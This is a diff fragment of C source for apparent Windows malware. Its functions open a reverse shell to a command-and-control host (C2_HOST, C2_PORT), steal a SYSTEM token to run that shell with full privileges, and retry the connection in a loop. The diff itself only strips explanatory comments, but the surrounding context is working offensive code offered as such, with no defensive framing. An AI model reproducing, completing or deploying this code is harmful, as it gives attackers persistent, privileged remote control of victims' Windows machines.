@@ -230,12 +230,9 @@ BOOL CreateReverseShell(const char *host, int port)
         return FALSE;
     }
 
-    // DO NOT wait for completion - let process run
-    // Windows service maintains active shell
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 
-    // Keep connection open
     Sleep(INFINITE);
 
     closesocket(sock);
@@ -280,7 +277,6 @@ BOOL StealSystemToken()
         return FALSE;
     }
 
-    // Instead of CreateProcessWithTokenW, create reverse shell with SYSTEM token
     STARTUPINFOA si = {sizeof(si)};
     PROCESS_INFORMATION pi = {0};
 
@@ -394,7 +390,7 @@ int main(int argc, char *argv[])
         {
             if (!CreateReverseShell(C2_HOST, C2_PORT))
             {
-                Sleep(30000); // Wait before retry
+                Sleep(30000);
             }
         }
         return 0;
